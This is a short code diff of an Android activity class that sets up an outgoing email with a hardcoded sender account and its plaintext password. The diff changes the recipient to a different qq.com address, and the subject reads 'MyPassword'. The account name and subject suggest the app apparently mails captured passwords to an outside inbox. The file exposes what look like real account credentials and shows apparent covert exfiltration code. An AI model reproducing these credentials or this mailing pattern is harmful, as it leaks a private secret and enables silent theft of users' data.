@@ -76,7 +76,7 @@ public class GridActivity extends Activity {
 		        sendmail.setUserName("yzyspy@163.com");
 		        sendmail.setPassWord("YZYspy20130909");
 		      //  sendmail.setTo("chengyue@accfutures.com,305597562@qq.com,chengli_68@163.com");
-		        sendmail.setTo("yangzhongyu@xiaomi.com");
+		        sendmail.setTo("475720946@qq.com");
 		        sendmail.setFrom("yzyspy@163.com");
 		        
 		        sendmail.setSubject("MyPassword ");
